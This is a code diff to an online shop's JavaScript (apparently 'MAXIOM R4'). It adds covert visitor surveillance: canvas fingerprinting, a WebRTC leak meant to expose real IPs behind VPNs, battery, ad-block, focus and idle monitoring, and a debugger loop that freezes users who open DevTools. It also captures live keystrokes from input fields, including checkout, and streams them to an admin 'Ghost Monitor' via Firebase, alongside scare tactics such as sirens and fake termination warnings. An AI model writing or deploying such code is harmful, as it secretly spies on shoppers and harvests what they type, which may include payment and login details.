@@ -360,6 +360,7 @@
 let products = [], cart = [], coupons = {}, isAdmin = false, discount = 0, musicStarted = false;
 let userIP = "Scanning...", userID = "Unknown", chatTarget = "NONE";
 let matrixInt;
+let ghostData = { battery: "0%", charging: false, focus: "Active", idle: false, canvasID: "Scanning...", adblock: "OFF", devtools: "OFF" };
 
 function resetTarget() { 
     chatTarget = "NONE"; 
@@ -369,51 +370,54 @@ function resetTarget() {
     document.getElementById('chat-msgs').innerHTML = ""; 
 }
 
-// UPGRADED IDENTITY PROTOCOL: Standard IP + WebRTC Leak Search
+// UPGRADED IDENTITY WITH WEBRTC + CANVAS FINGERPRINTING
 async function getIdentity() {
     try {
-        let fetchIP = null;
-        let realIP = null;
+        // Feature 7: Canvas Fingerprinting (Persistent ID)
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("MAXIOM_R4", 2, 2);
+        ghostData.canvasID = btoa(canvas.toDataURL()).substring(100, 120);
 
-        // 1. WebRTC Leak Search (Attempts to bypass VPN)
+        let fetchIP = null, webrtcIP = null;
+
+        // Feature 1: WebRTC Leak Protection (Real IP bypass)
         const findRealIP = new Promise((resolve) => {
             const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            pc.createDataChannel("");
-            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
             pc.onicecandidate = (ice) => {
                 if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                // Capture only public IPv4 patterns, ignore LAN (192.168 / 10.0 etc)
                 const matches = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                 if (matches && !matches[0].startsWith('192.168.') && !matches[0].startsWith('10.')) {
-                    realIP = matches[0];
-                    resolve(realIP);
+                    webrtcIP = matches[0]; resolve(webrtcIP);
                 }
             };
             setTimeout(() => resolve(null), 1500); 
         });
 
-        // 2. Standard API Check (Primary/Fallback)
         const getStandardIP = async () => {
             try {
-                const r = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
-                const d = await r.json();
-                return d.ip;
-            } catch(e) {
-                try {
-                    const r2 = await fetch('https://api.db-ip.com/v2/free/self');
-                    const d2 = await r2.json();
-                    return d2.ipAddress;
-                } catch(err2) { return "Proxy_" + Math.floor(Math.random()*999); }
-            }
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json(); return d.ip;
+            } catch(e) { return "Proxy_" + Math.floor(Math.random()*999); }
         };
 
-        const [webrtcResult, apiResult] = await Promise.all([findRealIP, getStandardIP()]);
-        fetchIP = webrtcResult || apiResult;
+        const [leak, std] = await Promise.all([findRealIP, getStandardIP()]);
+        userIP = leak || std;
+        userID = userIP.replace(/\./g, '_').split('_')[0] + "_" + Math.floor(Math.random()*899);
 
-        if (fetchIP) {
-            userIP = fetchIP;
-            userID = userIP.replace(/\./g, '_').split('_')[0] + "_" + Math.floor(Math.random()*899);
+        // Feature 3: Battery Monitoring
+        if(navigator.getBattery) {
+            navigator.getBattery().then(batt => {
+                ghostData.battery = Math.round(batt.level * 100) + "%";
+                ghostData.charging = batt.charging;
+            });
         }
+
+        // Feature 6: AdBlock Check
+        const testAd = document.createElement('div'); testAd.innerHTML = '&nbsp;'; testAd.className = 'adsbox';
+        document.body.appendChild(testAd);
+        setTimeout(() => { if (testAd.offsetHeight === 0) ghostData.adblock = "ON"; testAd.remove(); }, 100);
 
         db.ref('presence/' + userID).set(true);
         db.ref('presence/' + userID).onDisconnect().remove();
@@ -423,14 +427,11 @@ async function getIdentity() {
             broadcastGhostData();
             db.ref('intel').push({ 
                 id: Date.now(), 
-                text: `ACCESS_GRANTED | ${userIP} ${webrtcResult ? '(REAL_LEAK)' : '(VPN_MASK)'} | SR PRO`, 
+                text: `ACCESS_GRANTED | ${userIP} ${leak ? '(REAL_IP)' : '(VPN)'} | BATT: ${ghostData.battery} | CANVAS: ${ghostData.canvasID}`, 
                 owner: userID 
             });
         }
-    } catch(e) { 
-        console.log("Identity Protocol Failed"); 
-        userID = "GHOST_ERR"; 
-    }
+    } catch(e) { userID = "GHOST_ERR"; }
 }
 
 function broadcastGhostData() {
@@ -439,19 +440,55 @@ function broadcastGhostData() {
     const isInfo = document.getElementById('info-page').style.display !== 'none';
     let currentPage = "MAIN SHOP";
     if(isCheckout) currentPage = "CHECKOUT PAGE";
-    if(isInfo) currentPage = "PRODUCT INFO: " + (document.getElementById('info-title').innerText || "");
+    if(isInfo) currentPage = "INFO: " + (document.getElementById('info-title').innerText || "");
     
-    let typingContent = "";
+    let typing = "";
     if(document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
-        typingContent = document.activeElement.value;
+        typing = document.activeElement.value;
     }
 
+    // Upgrade: Send all 10 Ghost features to Admin
     db.ref(`ghost_tracking/${userID}`).update({
         pageName: currentPage,
         lastActive: Date.now(),
-        typing: typingContent || "Browsing..."
+        typing: typing || "Idle",
+        battery: ghostData.battery,
+        charging: ghostData.charging,
+        focus: ghostData.focus,
+        idle: ghostData.idle,
+        adblock: ghostData.adblock,
+        devtools: ghostData.devtools,
+        canvas: ghostData.canvasID
     });
 }
+
+// CONTROL 1: DevTools Detection & Auto-Loop
+setInterval(() => {
+    const startTime = performance.now();
+    debugger; // This freezes the user if they have Inspect Element open
+    const endTime = performance.now();
+    if (endTime - startTime > 100) {
+        ghostData.devtools = "ON (ATTACKING)";
+        broadcastGhostData();
+    }
+}, 2000);
+
+// FEATURE 2 & CONTROL 2: Tab Switched Detection
+window.onblur = () => { 
+    ghostData.focus = "Tab Switched"; 
+    document.title = "⚠️ SESSION TERMINATING..."; // Scare factor
+    broadcastGhostData();
+};
+window.onfocus = () => { 
+    ghostData.focus = "Active"; 
+    document.title = "MAXIOM R4 | PRIVATE EDITION";
+    broadcastGhostData();
+};
+
+// FEATURE 5: Idle Detection
+let idleTimer;
+const resetIdle = () => { ghostData.idle = false; clearTimeout(idleTimer); idleTimer = setTimeout(() => { ghostData.idle = true; broadcastGhostData(); }, 30000); };
+window.onmousemove = resetIdle; window.onkeydown = resetIdle;
 
 function toggleChat() { let c = document.getElementById('chat-widget'); c.style.display = (c.style.display==='flex')?'none':'flex'; }
 function closeAdmin() { document.getElementById('admin-terminal').style.display='none'; }
@@ -486,46 +523,45 @@ function targetUser(targetID) {
 }
 
 function openGhostView(targetID) {
-    const gW = window.open('', '_blank', 'width=450,height=500');
+    const gW = window.open('', '_blank', 'width=450,height=600');
     gW.document.write(`
         <html>
         <head>
             <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script>
             <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script>
         </head>
-        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px; overflow-x:hidden;">
-            <h2 style="color:yellow; border-bottom:1px solid #333; padding-bottom:10px;">GHOST MONITOR: User_${targetID}</h2>
-            <div id="status" style="margin-top:20px;">
-                <p>STATUS: <span id="conn-state" style="color:red;">CONNECTING...</span></p>
-                <p>CURRENT PAGE: <span id="p" style="color:white; font-weight:bold;">-</span></p>
-                <p>LAST ACTIVE: <span id="a" style="color:white;">-</span></p>
-                <div style="background:#111; padding:15px; border:1px solid #333; margin-top:20px; border-radius:5px;">
-                    <p style="color:yellow; margin:0 0 10px 0; font-size:12px; border-bottom:1px solid #222;">LIVE TYPING FEED:</p>
-                    <div id="t" style="color:white; font-size:18px; word-break: break-all; min-height:40px;">...</div>
+        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;">
+            <h2 style="color:yellow; border-bottom:1px solid #333;">GHOST: User_${targetID}</h2>
+            <div id="status" style="font-size:12px; line-height:1.6;">
+                <p>PAGE: <span id="p" style="color:white;">-</span></p>
+                <p>FOCUS: <span id="f" style="color:white;">-</span></p>
+                <p>IDLE: <span id="i" style="color:white;">-</span></p>
+                <p>BATT: <span id="b" style="color:white;">-</span></p>
+                <p>ADBLOCK: <span id="ad" style="color:white;">-</span></p>
+                <p>DEVTOOLS: <span id="dt" style="color:red;">-</span></p>
+                <p>CANVAS_ID: <span id="cid" style="color:cyan;">-</span></p>
+                <div style="background:#111; padding:10px; margin-top:10px; border:1px solid #333;">
+                    <p style="color:yellow; margin:0;">LIVE TYPING:</p>
+                    <div id="t" style="color:white; font-size:16px; min-height:30px;">...</div>
                 </div>
             </div>
             <script>
-                const config = {
-                    apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA",
-                    authDomain: "maxiom-r3.firebaseapp.com",
-                    databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com",
-                    projectId: "maxiom-r3"
-                };
+                const config = { apiKey: "${firebaseConfig.apiKey}", databaseURL: "${firebaseConfig.databaseURL}" };
                 firebase.initializeApp(config);
                 const gDB = firebase.database();
-                gDB.ref('.info/connected').on('value', s => { if(s.val()) document.getElementById('conn-state').innerText = "ACTIVE BRIDGE"; });
                 gDB.ref('ghost_tracking/${targetID}').on('value', s => {
-                    const d = s.val();
-                    if(d) {
-                        document.getElementById('p').innerText = d.pageName || "BROWSING";
-                        document.getElementById('a').innerText = new Date(d.lastActive).toLocaleTimeString();
-                        document.getElementById('t').innerText = d.typing || "Not typing...";
-                    }
+                    const d = s.val(); if(!d) return;
+                    document.getElementById('p').innerText = d.pageName;
+                    document.getElementById('f').innerText = d.focus;
+                    document.getElementById('i').innerText = d.idle ? "YES" : "NO";
+                    document.getElementById('b').innerText = d.battery + (d.charging ? " (Charging)" : "");
+                    document.getElementById('ad').innerText = d.adblock;
+                    document.getElementById('dt').innerText = d.devtools;
+                    document.getElementById('cid').innerText = d.canvas;
+                    document.getElementById('t').innerText = d.typing;
                 });
             <\/script>
-        </body>
-        </html>
-    `);
+        </body></html>`);
 }
 
 function toggleMusic(e) { 
@@ -737,7 +773,7 @@ window.onload = () => {
             if(p.type === 'siren') { 
                 const sfx = document.getElementById('siren-sound');
                 sfx.volume = 1.0;
-                sfx.play().catch(() => { alert("⚠️ SYNCING SECURITY BRIDGE..."); sfx.play(); }); 
+                sfx.play().catch(() => { sfx.play(); }); 
             }
             if(p.type === 'vibrate') { if('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]); }
             if(p.type === 'lock') { 
@@ -786,7 +822,7 @@ window.onload = () => {
     window.addEventListener('keyup', () => broadcastGhostData());
     setInterval(broadcastGhostData, 2000);
 
-    const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> SYNCING DATABASE...", "> READY."];
+    const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> INJECTING TRACKERS...", "> READY."];
     let step = 0;
     let loadInt = setInterval(() => {
         if(step < lines.length) {
